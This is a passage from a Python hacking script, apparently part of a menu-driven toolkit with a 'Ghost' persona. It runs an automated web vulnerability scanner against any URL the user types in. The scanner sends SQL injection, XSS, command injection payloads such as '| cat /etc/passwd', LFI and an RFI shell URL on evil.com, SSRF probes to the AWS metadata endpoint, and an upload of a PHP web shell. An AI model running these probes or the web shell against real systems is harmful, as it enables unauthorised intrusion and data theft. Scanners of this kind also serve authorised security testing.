                    ("'", "Error-based SQLi", "SQL syntax error"),
                    ("' OR '1'='1", "Boolean-based SQLi", "Always true condition"),
                    ("' UNION SELECT 1,2,3--", "Union-based SQLi", "Unexpected columns")
                ]
                for payload, vuln_type, details in payloads:
                    try:
                        test_url = f"{self.target_url}?id={payload}"
                        response = self.session.get(test_url, timeout=self.timeout)
                        if re.search(r"SQL syntax|mysql_|unexpected token", response.text, re.I):
                            self.print_vuln("High", test_url, payload, f"{details} | Status: {response.status_code}")
                    except:
                        continue
            def check_xss(self):
                payloads = [
                    ('<script>alert(1)</script>', "Basic XSS"),
                    ('<img src=x onerror=alert(1)>', "Image-based XSS"),
                    ('"><script>alert(1);</script>//', "DOM-based XSS"),
                ]
                for payload, details in payloads:
                    try:
                        test_url = f"{self.target_url}?search={payload}"
                        response = self.session.get(test_url)
                        if payload in response.text:
                            self.print_vuln("Medium", test_url, payload, f"{details} | Reflected input")
                    except:
                        continue
            def check_command_injection(self):
                payloads = [
                    ('; ls', "List directory"),
                    ('| cat /etc/passwd', "Read system file"),
                    ('`id`', "Command substitution")
                ]
                for payload, details in payloads:
                    try:
                        test_url = f"{self.target_url}?cmd={payload}"
                        response = self.session.get(test_url)
                        if "root:x:" in response.text or "uid=" in response.text:
                            self.print_vuln("Critical", test_url, payload, f"OS Command executed: {details}")
                    except:
                        continue
            def check_directory_traversal(self):
                payloads = [
                    ('../../../../etc/passwd', "LFI Attack"),
                    ('http://evil.com/shell.php', "RFI Attack")
                ]
                for payload, details in payloads:
                    try:
                        test_url = f"{self.target_url}?file={payload}"
                        response = self.session.get(test_url)
                        if "root:x:" in response.text or "evil.com" in response.text:
                            self.print_vuln("Critical", test_url, payload, details)
                    except:
                        continue
            def check_insecure_headers(self):
                try:
                    response = self.session.head(self.target_url)
                    headers = response.headers
                    missing = []
                    if 'Content-Security-Policy' not in headers:
                        missing.append("CSP")
                    if 'X-Content-Type-Options' not in headers:
                        missing.append("X-Content-Type-Options")
                    if 'X-Frame-Options' not in headers:
                        missing.append("Clickjacking Protection")
                    if missing:
                        self.print_vuln("Low", self.target_url, "HEADERS", f"Missing security headers: {', '.join(missing)}")
                except:
                    pass
            def check_file_upload(self):
                try:
                    test_file = {'file': ('exploit.php', '<?php system($_GET["cmd"]); ?>')}
                    response = self.session.post(self.target_url, files=test_file)
                    if 'exploit.php' in response.text and response.status_code == 200:
                        self.print_vuln("High", self.target_url, "PHP File Upload", "Unrestricted file upload detected")
                except:
                    pass
            def check_ssrf(self):
                payloads = [
                    ('http://169.254.169.254/latest/meta-data/', "AWS Metadata"),
                    ('http://localhost:8080', "Internal service access")
                ]
                for payload, details in payloads:
                    try:
                        test_url = f"{self.target_url}?url={payload}"
                        response = self.session.get(test_url)
                        if "AMI ID" in response.text or "localhost" in response.text:
                            self.print_vuln("High", test_url, payload, f"SSRF to {details}")
                    except:
                        continue
            def check_cors(self):
                try:
                    origin = 'http://evil.com'
                    headers = {'Origin': origin}
                    response = self.session.get(self.target_url, headers=headers)
                    if origin in response.headers.get('Access-Control-Allow-Origin', ''):
                        self.print_vuln("Medium", self.target_url, "CORS", "Misconfigured CORS allows arbitrary origins")
                except:
                    pass
            def check_csrf(self):
                try:
                    response = self.session.get(self.target_url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    forms = soup.find_all('form')
                    for form in forms:
                        if not form.find('input', {'name': 'csrf_token'}):
                            self.print_vuln("Medium", self.target_url, "CSRF", "Missing CSRF token in form")
                except:
                    pass
        if __name__ == '__main__':
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write your target url")
            target_url = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL).strip()
            scanner = UltimateScanner(target_url)
            scanner.start_scan()
elif choose == '15' : 
    exit
else:
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,Fore.RED +"you","must","choose","numbuer"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
